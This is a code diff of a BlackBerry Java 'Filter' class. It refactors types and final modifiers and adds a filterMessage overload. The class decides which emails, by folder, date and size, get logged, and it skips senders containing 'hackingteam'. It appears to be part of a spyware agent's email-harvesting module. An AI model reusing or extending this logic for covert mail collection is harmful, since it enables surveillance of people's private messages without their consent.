@@ -17,8 +17,6 @@ import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
-import net.rim.blackberry.api.mail.event.FolderEvent;
-import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.agent.Prefix;
 import blackberry.utils.Check;
@@ -71,8 +69,8 @@ public class Filter {
     public Date fromDate;
     public boolean doFilterToDate;
     public Date toDate;
-    public long maxMessageSize;
-    public long maxMessageSizeToLog;
+    public int maxMessageSize;
+    public int maxMessageSizeToLog;
 
     public Vector keywords = new Vector();
 
@@ -145,23 +143,27 @@ public class Filter {
             enabled = databuffer.readInt() == 1;
             all = databuffer.readInt() == 1;
             doFilterFromDate = databuffer.readInt() == 1;
-            long filetimeFromDate = databuffer.readLong();
+            final long filetimeFromDate = databuffer.readLong();
             doFilterToDate = databuffer.readInt() == 1;
-            long filetimeToDate = databuffer.readLong();
+            final long filetimeToDate = databuffer.readLong();
             maxMessageSize = databuffer.readInt();
             maxMessageSizeToLog = databuffer.readInt();
 
-            //#ifdef DEBUG_TRACE
             if (doFilterFromDate) {
-                DateTime dt = new DateTime(filetimeFromDate);
+                final DateTime dt = new DateTime(filetimeFromDate);
                 fromDate = dt.getDate();
+                //#ifdef DEBUG_TRACE
                 debug.trace("from: " + fromDate.toString());
+                //#endif
             }
             if (doFilterToDate) {
-                DateTime dt = new DateTime(filetimeToDate);
+                final DateTime dt = new DateTime(filetimeToDate);
                 toDate = dt.getDate();
+                //#ifdef DEBUG_TRACE
                 debug.trace("to: " + toDate.toString());
+                //#endif
             }
+            //#ifdef DEBUG_TRACE
             debug.trace("maxMessageSize: " + maxMessageSize);
             debug.trace("maxMessageSizeToLog: " + maxMessageSizeToLog);
             //#endif
@@ -214,7 +216,7 @@ public class Filter {
      * @throws MessagingException
      *             the messaging exception
      */
-    public int filterMessage(final Message message, final long lastcheck)
+    public final int filterMessage(final Message message, final long lastcheck)
             throws MessagingException {
 
         //#ifdef DBC
@@ -234,13 +236,14 @@ public class Filter {
          * + new Date(toDate));
          */
 
-        Address[] from = message.getRecipients(Message.RecipientType.FROM);
+        final Address[] from = message
+                .getRecipients(Message.RecipientType.FROM);
         //#ifdef DBC
         Check.asserts(from != null, "filterMessage: from!=null");
         //#endif
         //#ifdef EXCLUDE_INTERNAL
         for (int i = 0; i < from.length; i++) {
-            String addr = from[i].getAddr();
+            final String addr = from[i].getAddr();
             if (addr != null && addr.indexOf("hackingteam") > -1) {
                 debug.info("INTERNAL Address, skip it");
                 return FILTERED_INTERNAL;
@@ -252,12 +255,12 @@ public class Filter {
             return FILTERED_SENDMAIL;
         }
 
-        Folder folder = message.getFolder();
+        final Folder folder = message.getFolder();
 
         boolean found = false;
         if (folder != null) {
-            int folderType = folder.getType();
-            int fsize = folderTypes.length;
+            final int folderType = folder.getType();
+            final int fsize = folderTypes.length;
 
             for (int i = 0; i < fsize; i++) {
                 if (folderTypes[i] == folderType) {
@@ -288,7 +291,7 @@ public class Filter {
         }
 
         receivedTime = message.getReceivedDate().getTime();
-        if (receivedTime < lastcheck) {
+        if (lastcheck != 0 && receivedTime < lastcheck) {
             //#ifdef DEBUG_INFO
             debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                     + lastcheck);
@@ -325,17 +328,23 @@ public class Filter {
         return FILTERED_OK;
     }
 
+    public final int filterMessage(final Message message)
+            throws MessagingException {
+        return filterMessage(message, 0);
+
+    }
+
     /**
      * Checks if is valid.
      * 
      * @return true, if is valid
      */
-    public boolean isValid() {
+    public final boolean isValid() {
         return valid;
     }
 
-    public String toString() {
-        StringBuffer sb = new StringBuffer();
+    public final String toString() {
+        final StringBuffer sb = new StringBuffer();
         switch (classtype) {
         case Filter.CLASS_EMAIL:
             sb.append("EMAIL ");
